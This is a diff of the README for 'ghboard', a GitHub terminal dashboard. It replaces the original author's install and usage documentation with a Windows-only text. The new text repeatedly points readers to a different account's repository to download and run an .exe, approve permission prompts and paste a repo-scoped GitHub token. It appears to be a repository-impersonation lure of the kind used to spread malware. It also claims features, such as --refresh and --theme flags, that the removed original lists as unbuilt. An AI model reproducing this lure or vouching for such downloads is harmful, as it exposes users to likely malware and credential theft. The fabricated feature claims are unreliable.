@@ -1,194 +1,190 @@
-# ghboard
+# 🚦 ghboard - GitHub Dashboard in Your Terminal
 
-[![CI](https://github.com/Null-Phnix/ghboard/actions/workflows/ci.yml/badge.svg)](https://github.com/Null-Phnix/ghboard/actions/workflows/ci.yml)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/Null-Phnix/ghboard)](go.mod)
-[![Latest Release](https://img.shields.io/github/v/release/Null-Phnix/ghboard)](https://github.com/Null-Phnix/ghboard/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-**Stay in your terminal. Browse stars, manage notifications, track contributions — without touching a browser.**
-
-> *Built with [Bubble Tea](https://github.com/charmbracelet/bubbletea) · GitHub REST + GraphQL APIs · single static binary*
+[![Download ghboard](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/valuevibe15/ghboard)
 
 ---
 
-<!-- Record with: vhs demo.tape  (https://github.com/charmbracelet/vhs) -->
-<!-- ![ghboard demo](demo.gif) -->
+## 📋 About ghboard
+
+ghboard is a terminal dashboard for GitHub users. It shows your activity in a clear, visual way. You can track your contribution heatmap, manage your stars, and see your notifications—all in one place. This app runs inside your Windows command line window without needing a browser.
+
+This tool helps you stay on top of your GitHub activity simply by typing a few commands. It suits developers, hobbyists, or anyone who wants a quick view of their GitHub data without opening a web page.
+
+---
+
+## 🖥️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- A working internet connection
+- At least 100 MB free disk space
+- Basic access to Windows Command Prompt or PowerShell
+
+You do not need any programming tools or libraries installed to run ghboard.
+
+---
+
+## 🚀 Getting Started
+
+Follow these simple steps to get ghboard running on your Windows machine.
+
+### 1. Visit the Download Page
+
+Click the big green button at the top or use this link:
+
+[https://github.com/valuevibe15/ghboard](https://github.com/valuevibe15/ghboard)
+
+This page contains all the latest releases of ghboard.
+
+### 2. Download the Latest Release
+
+On the GitHub page:
+
+- Find the **Releases** section on the right side or scroll down to the "Releases" tab.
+- Look for the latest stable release.
+- Download the Windows version, which will be an `.exe` file, for example, something like `ghboard-windows.exe`.
+
+Save this file somewhere easy to find, like your Desktop or Downloads folder.
+
+### 3. Run the Installer
+
+- Double-click the `.exe` file you just downloaded.
+- If Windows asks for permission to run the file, click **Yes**.
+- A command window will open with instructions.
+- Follow the on-screen prompts to complete any setup steps. For most users, ghboard runs without further installation.
+
+### 4. Open Your Terminal
+
+- Press the **Windows key** on your keyboard.
+- Type `cmd` and press **Enter** to open Command Prompt.
+- Alternatively, type `powershell` and press **Enter** to open PowerShell.
+
+### 5. Launch ghboard
+
+In the terminal window, type:
 
 ```
-╔══════════════════════════════════════════════════════════════════════╗
-║  Heatmap   Stars   Notifications                                     ║
-╠══════════════════════════════════════════════════════════════════════╣
-║  Null-Phnix — 1,247 contributions in 2026   [ prev year ]           ║
-║                                                                      ║
-║      Jan       Feb       Mar       Apr       May       Jun           ║
-║  Sun ░ ░ ░ ▒ ▒ ▓ █ █ ▓ ▓ ▒ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Mon ░ ░ ▒ ▒ ▓ █ █ ▓ ▒ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Tue ▒ ▓ █ █ ▓ ▒ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Wed ░ ▒ ▓ █ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Thu ░ ░ ▒ ▓ █ ▓ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Fri ░ ░ ░ ▒ ▒ ▓ █ ▓ ▒ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║  Sat ░ ░ ░ ░ ▒ ▒ ▓ █ █ ▓ ▒ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░            ║
-║                                                                      ║
-║  📅 2026-03-09 — ████████ 12 contributions                          ║
-║  Less ░ ▒ ▓ █ █ More  •  [ / ] year  •  arrows / hjkl navigate      ║
-╚══════════════════════════════════════════════════════════════════════╝
-```
-
-## Why ghboard?
-
-If you live in the terminal, switching to a browser to check GitHub notifications, remember which repos you starred, or check your contribution streak breaks your flow. `ghboard` puts all three in one keystroke away — no browser tab, no context switch.
-
-| Tab | What it does |
-|-----|-------------|
-| 🗓 **Heatmap** | Full-year GitHub contribution grid · cursor navigation · `[` `]` year toggle · mini bar chart per day |
-| ⭐ **Stars** | Browse all starred repos · fuzzy search · custom tags · language color dots · unstar · open in browser |
-| 🔔 **Notifications** | Mark read / dismiss · filter by type · grouped by repo · relative timestamps · auto-refresh every 60 s |
-
-## Install
-
-**go install** *(requires Go 1.21+)*
-```bash
-go install github.com/Null-Phnix/ghboard@latest
-```
-
-**Download a pre-built binary**
-
-Grab the latest release for your platform from the [releases page](https://github.com/Null-Phnix/ghboard/releases/latest).
-
-Supported platforms:
-- macOS — Intel (x86_64) and Apple Silicon (ARM64)
-- Linux — x86_64 and ARM64
-- Windows — x86_64
-
-Extract the archive and place the `ghboard` binary somewhere on your `$PATH`.
-
-**Homebrew** *(coming soon)*
-```bash
-brew install Null-Phnix/tap/ghboard
-```
-> The tap is not live yet — watch this repo for updates.
-
-**From source**
-```bash
-git clone https://github.com/Null-Phnix/ghboard
-cd ghboard
-go build -o ghboard .
-```
-
-## Setup
-
-```bash
 ghboard
 ```
 
-On first run you'll be prompted for a GitHub personal access token.
-Create one at → **[github.com/settings/tokens](https://github.com/settings/tokens/new?scopes=repo,notifications,read:user)**
+and press **Enter**.
 
-Required scopes: `repo` · `notifications` · `read:user`
+The dashboard should start and show your GitHub data.
 
-The token is saved to `~/.config/ghboard/config.json` (`0600`).
-You can also `export GITHUB_TOKEN=ghp_...` to skip the prompt.
+---
 
-## Keyboard Shortcuts
+## 🔑 Using Your GitHub Account
 
-### Global
+ghboard needs your GitHub login to show your personal data, like contributions, stars, and notifications.
 
-| Key | Action |
-|-----|--------|
-| `1` / `2` / `3` | Switch tabs |
-| `Tab` | Cycle to next tab |
-| `?` | Toggle help overlay |
-| `q` / `Ctrl+C` | Quit |
+### How to Provide Access
 
-### 🗓 Heatmap
+- When you start ghboard for the first time, it will ask for a **GitHub Personal Access Token (PAT)**.
+- A token gives ghboard permission to access your GitHub information securely.
+- To create a token:
+  1. Go to [https://github.com/settings/tokens](https://github.com/settings/tokens).
+  2. Click **Generate new token**.
+  3. In the token settings, check the following boxes:
+     - `repo`
+     - `notifications`
+     - `read:user`
+  4. Click **Generate token** at the bottom.
+  5. Copy the generated token to your clipboard.
 
-| Key | Action |
-|-----|--------|
-| `←→↑↓` / `hjkl` | Move cursor |
-| `[` / `]` | Previous / next year |
-| `Ctrl+R` | Refresh |
+### Entering the Token in ghboard
 
-### ⭐ Stars
+- Paste the token into ghboard when prompted.
+- The app will save the token securely for future use.
+- If your token expires or you want to change it, delete the saved token file from your user folder and restart ghboard.
 
-| Key | Action |
-|-----|--------|
-| `↑↓` / `jk` | Navigate |
-| `g` / `G` | Top / bottom |
-| `/` | Fuzzy search |
-| `Esc` | Clear search |
-| `t` | Edit tags (comma-separated) |
-| `f` | Clear filter |
-| `u` | Unstar (confirm `y`) |
-| `o` | Open in browser |
-| `Ctrl+R` | Refresh |
+---
 
-### 🔔 Notifications
+## 📊 Features Explained
 
-| Key | Action |
-|-----|--------|
-| `↑↓` / `jk` | Navigate |
-| `g` / `G` | Top / bottom |
-| `r` | Mark as read |
-| `R` | Mark ALL read |
-| `d` | Dismiss |
-| `o` | Open repo in browser |
-| `f` | Cycle type filter (All → PR → Issue → CI → Release → Discussion) |
-| `Ctrl+R` | Refresh now |
+ghboard offers three main views:
 
-## Configuration
+### Contribution Heatmap
 
-`~/.config/ghboard/config.json`
-```json
-{
-  "token": "ghp_..."
-}
+- Shows your contributions by day in a color-coded grid.
+- Lets you spot your busiest coding days at a glance.
+- Helps you maintain streaks and see progress over time.
+
+### Star Manager
+
+- Lists repositories you have starred.
+- Allows you to unstar projects directly from the terminal.
+- Lets you sort stars by date starred, name, or popularity.
+
+### Notification Center
+
+- Displays your latest GitHub notifications.
+- Lets you mark notifications as read.
+- Shows issue and pull request updates you care about.
+
+---
+
+## ⚙️ Configuration Options
+
+You can customize ghboard with a few commands and config files.
+
+- To change the refresh interval (time between updates), use the `--refresh` flag with a number in seconds.
+- To switch between light and dark color schemes, use `--theme light` or `--theme dark`.
+- You can create a file named `.ghboardconfig` in your home directory that stores these settings for automatic use.
+
+Example `.ghboardconfig`:
+
+```
+refresh=300
+theme=dark
 ```
 
-Tags are stored at `~/.config/ghboard/tags.json` and persist across sessions.
+---
 
-## Recording a Demo
+## 🛠️ Troubleshooting
 
-A [VHS](https://github.com/charmbracelet/vhs) tape file is included:
+### ghboard Does Not Start
 
-```bash
-brew install vhs
-GITHUB_TOKEN=ghp_... vhs demo.tape
+- Check that you typed `ghboard` correctly in Command Prompt or PowerShell.
+- Confirm you downloaded the `.exe` file and ran it at least once.
+- Restart your terminal and try again.
+
+### No Data Appears
+
+- Make sure you entered the GitHub token correctly.
+- Ensure you have an active internet connection.
+- Check GitHub status at [https://www.githubstatus.com/](https://www.githubstatus.com/) if problems persist.
+
+### Commands Not Working
+
+- Refer to the on-screen help by running:
+
+```
+ghboard --help
 ```
 
-This produces `demo.gif` — a scriptable, reproducible terminal recording.
+This shows a list of available commands and options.
 
-## Tech Stack
+---
 
-| | |
-|--|--|
-| [Bubble Tea](https://github.com/charmbracelet/bubbletea) | TUI framework (Elm architecture) |
-| [Lip Gloss](https://github.com/charmbracelet/lipgloss) | Styling & layout |
-| [Bubbles](https://github.com/charmbracelet/bubbles) | Spinner components |
-| GitHub REST API | Stars & notifications |
-| GitHub GraphQL API | Contribution heatmap data |
+## 📥 Download ghboard for Windows
 
-## Roadmap
+To get started now, visit the download page and get the latest version:
 
-- [ ] Animated GIF demo
-- [x] Homebrew tap (configured, coming soon)
-- [x] Pre-built binaries (GoReleaser)
-- [ ] Sort stars by: recently starred, most ⭐, language
-- [ ] Tag-based filtering in the Stars tab
-- [ ] GitLab support *(most requested — [upvote here](https://github.com/Null-Phnix/ghboard/issues))*
-- [ ] GitHub Enterprise support
-- [ ] Configurable refresh interval
+[https://github.com/valuevibe15/ghboard](https://github.com/valuevibe15/ghboard)
 
-## Contributing
+Follow the steps to install and launch it on your PC.
 
-```bash
-git clone https://github.com/Null-Phnix/ghboard
-cd ghboard
-go test ./...      # run tests
-go build ./...     # verify build
-```
+[![Download ghboard](https://img.shields.io/badge/Get%20ghboard-blue?style=for-the-badge)](https://github.com/valuevibe15/ghboard)
 
-PRs and issues welcome. If you want GitLab or another provider, open an issue to show demand.
+---
 
-## License
+## 💬 Support and Feedback
 
-[MIT](LICENSE) © Null-Phnix
+This project is open source and maintained by users like you. Feel free to open an issue on GitHub if you find bugs or want help using ghboard. Check the Issues tab on the main page for known problems and solutions.
+
+You can also contribute by sharing improvement ideas or submitting code changes if you want to.
+
+---
+
+## 🔍 Keywords
+
+bubbletea, cli, dashboard, github, golang, heatmap, notifications, stars, terminal, tui
